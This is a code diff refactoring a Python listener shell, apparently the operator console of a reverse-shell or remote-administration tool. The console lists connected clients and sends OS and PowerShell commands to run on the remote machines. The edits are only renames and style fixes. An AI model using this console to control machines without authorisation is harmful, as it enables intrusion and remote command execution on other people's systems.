@@ -3,13 +3,13 @@ import socket
 from shell_ui.style import Style
 
 
-class ListenerShell(Style):
+class ListenerShell:
     """
     Handles all the user input for the listener shell.
     """
 
     def __init__(self, listener_socket):
-        self.listenerSocket = listener_socket
+        self.listener_socket = listener_socket
 
     def run(self):
         while True:
@@ -28,7 +28,7 @@ class ListenerShell(Style):
             sys.exit(0)
 
         elif command == 'help':
-            self.posSysMsg('Listener Shell Commands:\n')
+            Style.pos_sys_msg('Listener Shell Commands:\n')
             print('help   - shows this help menu')
             print('list   - lists all client connections and checks if they are active')
             print('select - start client shell by index')
@@ -37,36 +37,36 @@ class ListenerShell(Style):
         elif command == 'list':
             index = 0
 
-            for client in self.listenerSocket.getClients():
+            for client in self.listener_socket.get_clients():
                 try:
                     client.send('ACTIVE', [])
                     data, cwd = client.receive(1024)
                     if data == -1 and cwd == -1:
-                        self.negSysMsg('Client {} inactive'.format(index))
+                        Style.neg_sys_msg('Client {} inactive'.format(index))
                 except socket.error:
-                    self.negSysMsg('Client {} inactive'.format(index))
+                    Style.neg_sys_msg('Client {} inactive'.format(index))
                 else:
                     if data == 'ACTIVE':
-                        self.posSysMsg('Client {} active'.format(index))
+                        Style.pos_sys_msg('Client {} active'.format(index))
                     else:
-                        self.negSysMsg('Client {} inactive'.format(index))
+                        Style.neg_sys_msg('Client {} inactive'.format(index))
                 index += 1
 
         elif command[:6] == 'select':
             index = int(command[7])
-            client = self.listenerSocket.getClient(index)
+            client = self.listener_socket.get_client(index)
             shell = ClientShell(client)
             shell.run()
 
         elif command[:3] == 'del':
             index = int(command[4])
-            self.listenerSocket.delClient(index)
+            self.listener_socket.del_client(index)
 
         else:
-            self.negSysMsg('Command unknown')
+            Style.neg_sys_msg('Command unknown')
 
 
-class ClientShell(Style):
+class ClientShell:
     BUFFER_SIZE = 4096
 
     def __init__(self, client):
@@ -74,21 +74,22 @@ class ClientShell(Style):
 
     def run(self):
         """
-        The core part of ther listener shell.
+        The core part of the listener shell.
         Runs endlessly unless an exception occurs or exit is entered.
         """
-        self.posSysMsg('Starting shell with client')
+        Style.pos_sys_msg('Starting shell with client')
         # initialize cwd for shell
         self.client.send('', '')
         output, cwd = self.client.receive(1024)
-        if output == -1 and cwd == -1: return
+        if output == -1 and cwd == -1:
+            return
         while True:
             try:
                 command = input('{} > '.format(cwd))
             except KeyboardInterrupt:
                 print()
                 _ = self.execute('exit')
-                self.posSysMsg('Closed connection to client')
+                Style.pos_sys_msg('Closed connection to client')
                 break
             # determine if output needs to be send to not interrupt socket cycle
             execution_status = self.execute(command)
@@ -99,7 +100,8 @@ class ClientShell(Style):
             elif execution_status == 0:
                 # receive the client output
                 output, cwd = self.client.receive(self.BUFFER_SIZE)
-                if output == -1 and cwd == -1: break
+                if output == -1 and cwd == -1:
+                    break
                 print(output)
             # exit client shell
             elif execution_status == -2:
@@ -114,7 +116,7 @@ class ClientShell(Style):
         returns -1 if there is no expected output and -2 to exit the shell.
         """
         if command == 'help':
-            self.posSysMsg('Client Shell Commands:\n')
+            Style.pos_sys_msg('Client Shell Commands:\n')
             print('help           - shows this help menu')
             print('os <command>   - executes <command> on the remote system')
             print('pwsh <command> - executes <command> on the remote system in powershell')
@@ -128,12 +130,12 @@ class ClientShell(Style):
         elif command[:4] == 'pwsh':
             self.client.send('POWERSHELL', [command[5:]])
         elif command == 'exit':
-            self.posSysMsg('Exiting client shell')
+            Style.pos_sys_msg('Exiting client shell')
             self.client.send('EXIT', [])
             return -2
         elif command == 'background':
             return -2
         else:
-            self.negSysMsg('Command not recognized')
+            Style.neg_sys_msg('Command not recognized')
             return -1
         return 0
